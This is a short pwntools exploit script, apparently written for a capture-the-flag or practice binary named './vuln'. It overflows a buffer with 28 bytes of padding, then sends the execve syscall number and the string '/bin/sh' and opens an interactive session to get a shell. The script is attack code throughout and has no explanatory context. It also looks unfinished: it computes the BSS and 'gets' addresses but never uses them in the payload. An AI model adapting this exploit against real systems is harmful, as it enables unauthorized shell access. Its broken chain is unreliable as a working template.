from pwn import *


elf = ELF('./vuln')
binsh = p32(elf.bss())
gets = p32(elf.sym['gets'])


payload = 'A'*28
print elf.bss()
p = process('./vuln')
print p.recvuntil('?')
p.sendline(payload)
p.sendline(p32(59))
p.sendline('/bin/sh')
p.interactive()
